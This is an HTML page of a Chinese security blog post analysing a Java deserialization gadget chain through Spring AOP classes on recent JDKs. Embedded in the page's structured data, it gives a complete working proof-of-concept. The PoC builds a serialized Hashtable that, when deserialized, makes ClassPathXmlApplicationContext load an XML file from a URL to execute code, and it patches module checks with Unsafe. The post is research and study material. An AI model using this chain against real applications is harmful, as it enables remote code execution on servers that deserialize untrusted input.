@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>高版本jdk Spring aop链子 | Jiecub3</title>
+<meta name="keywords" content="">
+<meta name="description" content="前言：学习@jsjcw师傅在星球发的高版本jdk aop链，感觉会用到就去分析构造了下完整poc，起初以为就是一条平常的链子，实则暗藏了很多操">
+<meta name="author" content="Jiecub3">
+<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/%E9%AB%98%E7%89%88%E6%9C%ACjdk-spring-aop%E9%93%BE%E5%AD%90/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
+<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/%E9%AB%98%E7%89%88%E6%9C%ACjdk-spring-aop%E9%93%BE%E5%AD%90/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="高版本jdk Spring aop链子" />
+<meta property="og:description" content="前言：学习@jsjcw师傅在星球发的高版本jdk aop链，感觉会用到就去分析构造了下完整poc，起初以为就是一条平常的链子，实则暗藏了很多操" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/%E9%AB%98%E7%89%88%E6%9C%ACjdk-spring-aop%E9%93%BE%E5%AD%90/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-07-17T20:01:23+08:00" />
+<meta property="article:modified_time" content="2025-07-17T20:01:23+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="高版本jdk Spring aop链子"/>
+<meta name="twitter:description" content="前言：学习@jsjcw师傅在星球发的高版本jdk aop链，感觉会用到就去分析构造了下完整poc，起初以为就是一条平常的链子，实则暗藏了很多操"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Jiecub3.github.io/zh/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "高版本jdk Spring aop链子",
+      "item": "https://Jiecub3.github.io/zh/posts/java/chain/%E9%AB%98%E7%89%88%E6%9C%ACjdk-spring-aop%E9%93%BE%E5%AD%90/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "高版本jdk Spring aop链子",
+  "name": "高版本jdk Spring aop链子",
+  "description": "前言：学习@jsjcw师傅在星球发的高版本jdk aop链，感觉会用到就去分析构造了下完整poc，起初以为就是一条平常的链子，实则暗藏了很多操",
+  "keywords": [
+    
+  ],
+  "articleBody": " 前言：学习@jsjcw师傅在星球发的高版本jdk aop链，感觉会用到就去分析构造了下完整poc，起初以为就是一条平常的链子，实则暗藏了很多操作！膜拜佬！^!\n环境\n正常spring项目再加上下面这个依赖\norg.aspectj aspectjweaver 1.9.2 这里其实很奇怪，因为aop中的类需要上面的依赖的类，却还要我们导入这个依赖（应该直接融到spring里的才对\n0x01 简单利用思路 利用点在AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs，通过这里调用任意类的任意(无参|一个参数)方法\n然后继续向上查找调用，只有两处可以传入参数(参数指最后调用的args)，这里我们用的是returnValue\n继续向上找\n最上面会到JdkDynamicAopProxy#invoke，其中会调用proceed()然后再调用上图invoke()\n所以基本利用链就是找个readObject有方法调用的点触发JdkDynamicAopProxy#invoke然后一路到最后的利用invoke，但是调用起来并没有这么顺利\n其实利用路线不止这一条，无参也可以调用TemplatesImpl#newTransformer进行利用\n这里选择有参调用，主要是为了想调用ClassPathXmlApplicationContext，因为是高版本jdk，这里invoke调用有模块检测TemplatesImpl#newTransformer（写了个demo是不行的\n0x02 poc构造 其实这个我不知道怎么说，因为这条链子其实有点绕，我又不想从头开始构造了，那我就按调试过程来描述吧\n调用链\nHashtable#readObject HotSwappableTargetSource#equals Hashtable#equals $Proxy0#get JdkDynamicAopProxy#invoke ReflectiveMethodInvocation#proceed ExposeInvocationInterceptor#invoke --\u003e 设置mi，然后调用proceed() ReflectiveMethodInvocation#proceed AfterReturningAdviceInterceptor#invoke mi.proceed()-\u003eReflectiveMethodInvocation#invokeJoinpoint 1. 调用map.size()返回1，且不进入后续invokeAdviceMethod 2. 调用map.get()返回\"http://127.0.0.1:8888/poc.xml\"，一路到invoke AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs DefaultFormatter#stringToValue ClassPathXmlApplicationContext(String...) 1. ExposeInvocationInterceptor 这里需要先添加ExposeInvocationInterceptor再添加我们的目标advice，因为后面调用有个点会找一个值，ExposeInvocationInterceptor#invoke进行设置\n在afterReturning()后续处理，这里会查找mi，不设置这个就是null会报错\n然后这里再回到proceed()方法\n这里get(++index)获取到目标advice进入理想中的流程，这里this.interceptorsAndDynamicMethodMatchers就是JdkDynamicAopProxy的chain，getInterceptorsAndDynamicInterceptionAdvice()会进行正则匹配，匹配成功的advice会add到chain中，没有设置正则其实都会为true进行添加\nList chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); 2. actualArgs 经过调试发现这个args需要来自前面Object retVal = mi.proceed();\n而retVal这个值来之一个invoke调用的结果\n其中，target我们可以直接设置，method和args则来自proxy触发时的方法和参数，@jsjcw师傅是想到用Map#get来控制这个retVal值\n即我们需要让proxy在反序列化时触发一个get方法，这个在CC中其实利用很多了，这里是选择了Hashtable#equals来触发这个get方法\n3. hash HSTS 但是到Hashtable#equals这步也有技巧，看到这个e.key.equals(key)和上方equals中if (!(o instanceof Map\u003c?, ?\u003e t))（其含义：匹配o是不是Map对象，是的话赋值给t）\n得(key)t=proxy，e.key=Hashtable，但是hash要一样的话需要key=e.key这里显然就矛盾了\n然后这时就想到了(HSTS)HotSwappableTargetSource的hash是固定！且其equals方法正好能满足我们的需求，所以这里套用一层HotSwappableTargetSource\npublic boolean equals(Object other) { return (this == other || (other instanceof HotSwappableTargetSource \u0026\u0026 this.target.equals(((HotSwappableTargetSource) other).target))); } 这里本来还有个关于hash进入上图中if的问题，由于HSTS的加入，这个问题也不存在了\n4. size() 构造好上面这些后，发现size()时就会触发proxy，然后到最后利用点，size()返回值为(int)1，最后利用点invoke调用这个参数时会报错中断\n但是我们发现进入最后invoke前会有个类型判断，即type和returnValue的判断，这里type我们可以通过this.discoveredReturningType设置（这个值设置了returningName后面会被覆盖，但是是已经判断完了才覆盖的，所以可以用这个点）\n我们要调用的是ClassPathXmlApplicationContext的自构方法，所以这里type设置为String就行，returnValue为int时就不会进入后续invoke调用了，等map#get获取为我们\"http://127.0.0.1:8888/poc.xml\"才会进入后续invoke调用\nprivate boolean matchesReturnValue(Class\u003c?\u003e type, Method method, @Nullable Object returnValue) { if (returnValue != null) { return ClassUtils.isAssignableValue(type, returnValue); } 5. newInstance 然后就是利用点的查找，@jsjcw师傅找的是一个jackson依赖的AnnotatedConstructor#call1，但是jackson依赖也需要额外添加，并不是spring自带，像这种依赖需求肯定是越少越好，然后尝试找了下，发现应该是有不少能用的\n我用的是jdk自带的DefaultFormatter#stringToValue\n6. 其他 setFieldValue(aspectJAfterReturningAdvice,\"argumentNames\",new String[]{\"java.lang.Object\"}); setFieldValue(aspectJAfterReturningAdvice,\"returningName\",\"java.lang.Object\"); 然后还有点这个没讲吧，这个是跟actualArgs值获取有关的。这里returningName!=null才会把我们设置的returnValue传入到最后的invoke中去，然后这个值还跟一个报错有关，不设置会报错。\n不出网 @jsjcw师傅还提到用FileCopyUtils的copy方法创建一个本地xml，然后调用这个xml进行命令执行\n其他貌似没啥了\n0x03 poc \u0026 利用链 Hashtable#readObject HotSwappableTargetSource#equals Hashtable#equals $Proxy0#get JdkDynamicAopProxy#invoke ReflectiveMethodInvocation#proceed ExposeInvocationInterceptor#invoke --\u003e 设置mi，然后调用proceed() ReflectiveMethodInvocation#proceed AfterReturningAdviceInterceptor#invoke mi.proceed()-\u003eReflectiveMethodInvocation#invokeJoinpoint 1. 调用map.size()返回1，且不进入后续invokeAdviceMethod 2. 调用map.get()返回\"http://127.0.0.1:8888/poc.xml\"，一路到invoke AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs DefaultFormatter#stringToValue ClassPathXmlApplicationContext(String...) import com.fasterxml.jackson.databind.introspect.AnnotatedConstructor; import com.fasterxml.jackson.databind.introspect.AnnotationMap; import com.fasterxml.jackson.databind.introspect.TypeResolutionContext; import com.fasterxml.jackson.databind.type.TypeFactory; import org.springframework.aop.aspectj.AspectJAfterReturningAdvice; import org.springframework.aop.aspectj.AspectJAroundAdvice; import org.springframework.aop.aspectj.AspectJExpressionPointcut; import org.springframework.aop.aspectj.SingletonAspectInstanceFactory; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor; import org.springframework.aop.interceptor.ExposeInvocationInterceptor; import org.springframework.aop.target.HotSwappableTargetSource; import org.springframework.context.support.ClassPathXmlApplicationContext; import sun.misc.Unsafe; import javax.swing.text.DefaultFormatter; import java.io.*; import java.lang.reflect.*; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class Mytest2 { public static void main(String[] args) throws Exception { Class\u003c?\u003e clazz = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\"); Constructor\u003c?\u003e cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); HashMap\u003cString, String\u003e targetMap = new HashMap\u003c\u003e(); targetMap.put(\"argss\", \"http://127.0.0.1:8888/poc.xml\"); advisedSupport.setTarget(targetMap); Class\u003c?\u003e aClass = Class.forName(\"org.springframework.aop.interceptor.ExposeInvocationInterceptor\"); Constructor\u003c?\u003e declaredConstructor = aClass.getDeclaredConstructor(); declaredConstructor.setAccessible(true); ExposeInvocationInterceptor aspectJAroundAdvice0 = (ExposeInvocationInterceptor) declaredConstructor.newInstance(); // AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); // pointcut.setExpression(\".*get\"); advisedSupport.addAdvice(aspectJAroundAdvice0); AspectJAfterReturningAdvice aspectJAfterReturningAdvice = getAspectJAfterReturningAdvice(); AfterReturningAdviceInterceptor aspectJAroundAdvice = new AfterReturningAdviceInterceptor(aspectJAfterReturningAdvice); setFieldValue(aspectJAfterReturningAdvice,\"argumentNames\",new String[]{\"java.lang.Object\"}); setFieldValue(aspectJAfterReturningAdvice,\"returningName\",\"java.lang.Object\"); // setFieldValue(aspectJAfterReturningAdvice,\"argumentNames\",new String[]{\"java.lang.Object\"}); // setFieldValue(aspectJAfterReturningAdvice,\"throwingName\",\"java.lang.Object\"); // setFieldValue(aspectJAfterReturningAdvice,\"joinPointArgumentIndex\",-1); // setFieldValue(aspectJAfterReturningAdvice,\"joinPointStaticPartArgumentIndex\",-1); setFieldValue(aspectJAfterReturningAdvice,\"discoveredReturningType\",String.class); advisedSupport.addAdvice(aspectJAroundAdvice); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Map proxyObj = (Map) Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Map.class}, handler); Hashtable htobject = new Hashtable(); htobject.put(\"argss\",\"test\"); HotSwappableTargetSource htkey = new HotSwappableTargetSource(htobject); HotSwappableTargetSource htvalue = new HotSwappableTargetSource(proxyObj); Hashtable hashtable = new Hashtable(); hashtable.put(htkey, \"b\"); Method addEntry = hashtable.getClass().getDeclaredMethod(\"addEntry\", int.class, Object.class, Object.class, int.class); patchModule(Mytest2.class,hashtable.getClass()); addEntry.setAccessible(true); addEntry.invoke(hashtable, 0, htvalue, \"2B\", 0); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(hashtable); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } private static AspectJAfterReturningAdvice getAspectJAfterReturningAdvice() throws Exception { // Method mapGetMethod = Map.class.getMethod(\"get\", Object.class); // AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); //// pointcut.setExpression(\".*get\"); // 匹配 Map.get() // Map targetMap = new HashMap\u003c\u003e(); // SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(targetMap); // AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice( // mapGetMethod, pointcut, aif // ); // return advice; DefaultFormatter defaultFormatter = new DefaultFormatter(); defaultFormatter.setValueClass(ClassPathXmlApplicationContext.class); Method mapGetMethod = DefaultFormatter.class.getMethod(\"stringToValue\", String.class); AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); pointcut.setExpression(\"\"); SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(defaultFormatter); AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice( mapGetMethod, pointcut, aif ); return advice; // Constructor declaredConstructor = ClassPathXmlApplicationContext.class.getDeclaredConstructor(String.class); // Object o = newInstanceWithoutConstructor(TypeFactory.class); // TypeResolutionContext ctxt = new TypeResolutionContext.Empty((TypeFactory) o); // // // 3. 创建 AnnotationMap（存储注解信息，这里用空的） // AnnotationMap classAnn = new AnnotationMap(); // AnnotationMap[] paramAnn = new AnnotationMap[0]; // 无参数时用空数组 // // // 4. 初始化 AnnotatedConstructor 对象 // AnnotatedConstructor annotatedConstructor = new AnnotatedConstructor( // ctxt, declaredConstructor, classAnn, paramAnn // ); // Method mapGetMethod = annotatedConstructor.getClass().getMethod(\"call1\", Object.class); // AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); // pointcut.setExpression(\"\"); // SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(annotatedConstructor); // AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice( // mapGetMethod, pointcut, aif // ); // return advice; } public static void setFieldValue(Object obj,String filedName,Object value) throws NoSuchFieldException, IllegalAccessException { Field field = getField(obj.getClass(),filedName); field.setAccessible(true); field.set(obj,value); } public static Field getField(Class clazz,String fieldName) throws NoSuchFieldException { while (true){ Field[] fields = clazz.getDeclaredFields(); for(Field field:fields){ if(field.getName().equals(fieldName)){ return field; } } if(clazz == Object.class){ break; } clazz = clazz.getSuperclass(); } throw new NoSuchFieldException(fieldName); } } 参考\nhttps://wx.zsxq.com/mweb/views/topicdetail/topicdetail.html?topic_id=4848214582444528\u0026group_id=15522421588412\nhttps://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ\n",
+  "wordCount" : "3110",
+  "inLanguage": "zh",
+  "datePublished": "2025-07-17T20:01:23+08:00",
+  "dateModified": "2025-07-17T20:01:23+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Jiecub3"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/%E9%AB%98%E7%89%88%E6%9C%ACjdk-spring-aop%E9%93%BE%E5%AD%90/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Jiecub3",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Jiecub3.github.io/img/logo.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://Jiecub3.github.io/zh/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
+                    <span>搜索🔍︎</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      高版本jdk Spring aop链子
+    </h1>
+    <div class="post-meta"><span title='2025-07-17 20:01:23 +0800 CST'>2025-07-17</span>&nbsp;·&nbsp;7 分钟&nbsp;·&nbsp;Jiecub3
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#0x01-%e7%ae%80%e5%8d%95%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" aria-label="0x01 简单利用思路">0x01 简单利用思路</a></li>
+                    <li>
+                        <a href="#0x02-poc%e6%9e%84%e9%80%a0" aria-label="0x02 poc构造">0x02 poc构造</a><ul>
+                            
+                    <li>
+                        <a href="#1-exposeinvocationinterceptor" aria-label="1. ExposeInvocationInterceptor">1. ExposeInvocationInterceptor</a></li>
+                    <li>
+                        <a href="#2-actualargs" aria-label="2. actualArgs">2. actualArgs</a></li>
+                    <li>
+                        <a href="#3-hash-hsts" aria-label="3. hash HSTS">3. hash HSTS</a></li>
+                    <li>
+                        <a href="#4-size" aria-label="4. size()">4. size()</a></li>
+                    <li>
+                        <a href="#5-newinstance" aria-label="5. newInstance">5. newInstance</a></li>
+                    <li>
+                        <a href="#6-%e5%85%b6%e4%bb%96" aria-label="6. 其他">6. 其他</a><ul>
+                            
+                    <li>
+                        <a href="#%e4%b8%8d%e5%87%ba%e7%bd%91" aria-label="不出网">不出网</a></li></ul>
+                    </li></ul>
+                    </li>
+                    <li>
+                        <a href="#0x03-poc--%e5%88%a9%e7%94%a8%e9%93%be" aria-label="0x03 poc &amp;amp; 利用链">0x03 poc &amp; 利用链</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><blockquote>
+<p>前言：学习@jsjcw师傅在星球发的<code>高版本jdk aop链</code>，感觉会用到就去分析构造了下完整poc，起初以为就是一条平常的链子，实则暗藏了很多操作！膜拜佬！^!</p>
+</blockquote>
+<p><strong>环境</strong></p>
+<p>正常spring项目再加上下面这个依赖</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.aspectj<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>aspectjweaver<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>1.9.2<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>这里其实很奇怪，因为aop中的类需要上面的依赖的类，却还要我们导入这个依赖（应该直接融到spring里的才对</p>
+<p><img loading="lazy" src="../images/image-20250717100242893.png" alt="image-20250717100242893"  />
+</p>
+<h2 id="0x01-简单利用思路">0x01 简单利用思路<a hidden class="anchor" aria-hidden="true" href="#0x01-简单利用思路">#</a></h2>
+<p>利用点在<code>AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs</code>，通过这里调用<code>任意类</code>的任意(<code>无参|一个参数</code>)方法</p>
+<p><img loading="lazy" src="../images/image-20250717100824831.png" alt="image-20250717100824831"  />
+</p>
+<p>然后继续向上查找调用，只有两处<code>可以传入参数</code>(参数指最后调用的<code>args</code>)，这里我们用的是<code>returnValue</code></p>
+<p><img loading="lazy" src="../images/image-20250717101216957.png" alt="image-20250717101216957"  />
+</p>
+<p>继续向上找</p>
+<p><img loading="lazy" src="../images/image-20250717101522451.png" alt="image-20250717101522451"  />
+</p>
+<p>最上面会到<code>JdkDynamicAopProxy#invoke</code>，其中会调用<code>proceed()</code>然后再调用上图<code>invoke()</code></p>
+<p><img loading="lazy" src="../images/image-20250717101720667.png" alt="image-20250717101720667"  />
+</p>
+<p>所以基本利用链就是找个readObject有<code>方法调用的点</code>触发<code>JdkDynamicAopProxy#invoke</code>然后一路到最后的利用<code>invoke</code>，但是调用起来并没有这么顺利</p>
+<blockquote>
+<p>其实利用路线不止这一条，无参也可以调用<code>TemplatesImpl#newTransformer</code>进行利用</p>
+<p>这里选择<code>有参调用</code>，主要是为了想调用<code>ClassPathXmlApplicationContext</code>，因为是高版本jdk，这里invoke调用有模块检测<code>TemplatesImpl#newTransformer</code>（写了个demo是不行的</p>
+</blockquote>
+<h2 id="0x02-poc构造">0x02 poc构造<a hidden class="anchor" aria-hidden="true" href="#0x02-poc构造">#</a></h2>
+<p>其实这个我不知道怎么说，因为这条链子其实有点绕，我又不想从头开始构造了，那我就按调试过程来描述吧</p>
+<p><strong>调用链</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Hashtable#readObject
+</span></span><span class="line"><span class="cl">	HotSwappableTargetSource#equals
+</span></span><span class="line"><span class="cl">		Hashtable#equals
+</span></span><span class="line"><span class="cl">			$Proxy0#get
+</span></span><span class="line"><span class="cl">				JdkDynamicAopProxy#invoke
+</span></span><span class="line"><span class="cl">					ReflectiveMethodInvocation#proceed
+</span></span><span class="line"><span class="cl">						ExposeInvocationInterceptor#invoke  --&gt; 设置mi，然后调用proceed()
+</span></span><span class="line"><span class="cl">							ReflectiveMethodInvocation#proceed
+</span></span><span class="line"><span class="cl">								AfterReturningAdviceInterceptor#invoke
+</span></span><span class="line"><span class="cl">									mi.proceed()-&gt;ReflectiveMethodInvocation#invokeJoinpoint
+</span></span><span class="line"><span class="cl">									1. 调用map.size()返回1，且不进入后续invokeAdviceMethod
+</span></span><span class="line"><span class="cl">									2. 调用map.get()返回&#34;http://127.0.0.1:8888/poc.xml&#34;，一路到invoke
+</span></span><span class="line"><span class="cl">									AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs
+</span></span><span class="line"><span class="cl">										DefaultFormatter#stringToValue
+</span></span><span class="line"><span class="cl">											ClassPathXmlApplicationContext(String...)
+</span></span></code></pre></div><h3 id="1-exposeinvocationinterceptor">1. ExposeInvocationInterceptor<a hidden class="anchor" aria-hidden="true" href="#1-exposeinvocationinterceptor">#</a></h3>
+<p>这里需要先添加<code>ExposeInvocationInterceptor</code>再添加我们的<code>目标advice</code>，因为后面调用有个点会找一个值，<code>ExposeInvocationInterceptor#invoke</code>进行设置</p>
+<p><img loading="lazy" src="../images/image-20250717145533990.png" alt="image-20250717145533990"  />
+</p>
+<p>在<code>afterReturning()</code>后续处理，这里会查找mi，不设置这个就是null会报错</p>
+<p><img loading="lazy" src="../images/image-20250717145943174.png" alt="image-20250717145943174"  />
+</p>
+<p>然后这里再回到<code>proceed()</code>方法</p>
+<p><img loading="lazy" src="../images/image-20250717145736636.png" alt="image-20250717145736636"  />
+</p>
+<p>这里<code>get(++index)</code>获取到<code>目标advice</code>进入理想中的流程，这里<code>this.interceptorsAndDynamicMethodMatchers</code>就是<code>JdkDynamicAopProxy</code>的chain，<code>getInterceptorsAndDynamicInterceptionAdvice()</code>会进行正则匹配，匹配成功的advice会<code>add</code>到chain中，没有设置正则其实都会为true进行添加</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">List&lt;Object&gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);
+</span></span></code></pre></div><p><img loading="lazy" src="../images/image-20250717150220044.png" alt="image-20250717150220044"  />
+</p>
+<h3 id="2-actualargs">2. actualArgs<a hidden class="anchor" aria-hidden="true" href="#2-actualargs">#</a></h3>
+<p>经过调试发现这个<code>args</code>需要来自前面<code>Object retVal = mi.proceed();</code></p>
+<p><img loading="lazy" src="../images/image-20250717151616368.png" alt="image-20250717151616368"  />
+</p>
+<p>而retVal这个值来之一个<code>invoke调用的结果</code></p>
